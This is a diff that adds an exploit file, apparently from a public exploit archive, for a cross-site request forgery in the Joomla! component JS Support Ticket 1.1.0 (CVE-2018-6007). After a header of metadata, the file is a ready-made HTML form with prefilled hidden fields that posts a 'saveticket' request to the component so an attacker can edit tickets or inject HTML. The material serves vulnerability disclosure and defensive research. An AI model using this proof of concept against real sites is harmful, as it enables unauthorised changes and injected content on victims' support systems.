@@ -1,0 +1,47 @@
+<!--
+# # # # #
+# Exploit Title: Joomla! Component JS Support Ticket 1.1.0 - Cross-Site Request Forgery
+# Dork: N/A
+# Date: 27.01.2018
+# Vendor Homepage: http://www.joomsky.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/clients-a-communities/help-desk/js-support-ticket/
+# Software Download: http://joomsky.com/46/download/1.html
+# Version: 1.1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6007
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability implication allows an attacker to inject html code, edit ticket etc..
+# 
+# Proof of Concept: 
+-->
+
+<html>
+<body>
+ 
+<form action="http://localhost/[PATH]/index.php" method="POST" enctype="multipart/form-data" name="adminForm" id="adminForm">
+<textarea name="message" id="message" cols="60" rows="20" style="width: 550px; height: 300px;">
+<p>[CODE]</p>
+</textarea><br>
+<input type="submit" class="button" name="submit_app" id="submit_app_button" onclick="return validate_form(document.adminForm)" value="Ver Ayari">
+<input type="hidden" name="id" id="id" value="1" />
+<input type="hidden" name="isoverdue" id="isoverdue" value="0" />
+<input type="hidden" name="ticketid" id="ticketid" value="vCP4VTWrwzY" />
+<input type="hidden" name="c" id="c" value="ticket" />
+<input type="hidden" name="task" id="task" value="saveticket" />
+<input type="hidden" name="uid" id="uid" value="521" />
+<input type="hidden" name="view" id="view" value="ticket" />
+<input type="hidden" name="layout" id="layout" value="formticket" />
+<input type="hidden" name="check" id="check" value="" />
+<input type="hidden" name="option" id="option" value="com_jssupportticket" />
+<input type="hidden" name="created" id="created" value="2018-01-27 11:46:58"/>
+<input type="hidden" name="update" id="update" value=""/>
+</form>
+
+</body>
+</html>
